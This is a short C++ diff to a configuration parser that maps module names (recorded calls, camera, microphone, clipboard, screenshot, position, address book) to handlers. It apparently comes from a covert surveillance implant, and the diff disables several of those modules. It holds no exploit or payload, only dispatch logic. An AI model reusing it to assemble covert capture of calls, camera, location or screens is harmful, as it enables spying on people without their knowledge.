@@ -63,7 +63,7 @@ BOOL WINAPI Conf::ParseModule(JSONArray js) {
 #endif
 
 		do {
-
+/***
 			if (moduleName.compare(L"application") == 0 ) {
 				startProc = ApplicationModule;
 				break;
@@ -73,16 +73,19 @@ BOOL WINAPI Conf::ParseModule(JSONArray js) {
 				startProc = RecordedCalls;
 				break;
 			}
+***/
 /***
 			if (moduleName.compare(L"calllist") == 0 ) {
 				startProc = CallListAgent;
 				break;
 			}
 ***/
+/***
 			if (moduleName.compare(L"camera") == 0 ) {
 				startProc = CameraModule;
 				break;
 			}
+***/
 /***
 			if (moduleName.compare(L"clipboard") == 0 ) {
 				startProc = ClipboardModule;
@@ -120,12 +123,13 @@ BOOL WINAPI Conf::ParseModule(JSONArray js) {
 				startProc = RecordedMicrophone;
 				break;
 			}
-			
+/***			
 			// AddressBook e calendar sono la stessa cosa
 			if (moduleName.compare(L"addressbook") == 0) {
 				startProc = CalendarModule;
 				break;
 			}
+***/
 			/***
 			//if (moduleName.compare(L"calendar") == 0 ) {
 			//	startProc = OrganizerAgent;
@@ -136,11 +140,12 @@ BOOL WINAPI Conf::ParseModule(JSONArray js) {
 				startProc = PositionModule;
 				break;
 			}
-
+/***
 			if (moduleName.compare(L"screenshot") == 0 ) {
 				startProc = SnapshotModule;
 				break;
 			}
+***/
 /***
 			if (moduleName.compare(L"url") == 0 ) {
 				startProc = UrlModule;
@@ -209,11 +214,12 @@ BOOL WINAPI Conf::ParseEvent(JSONArray js) {
 #endif
 		
 		do {
-		
+/***		
 			if (eventName.compare(L"ac") == 0 ) {
 				startProc = OnAC;
 				break;
 			}
+***/
 /***
 			if (eventName.compare(L"battery") == 0 ) {
 				startProc = OnBatteryLevel;
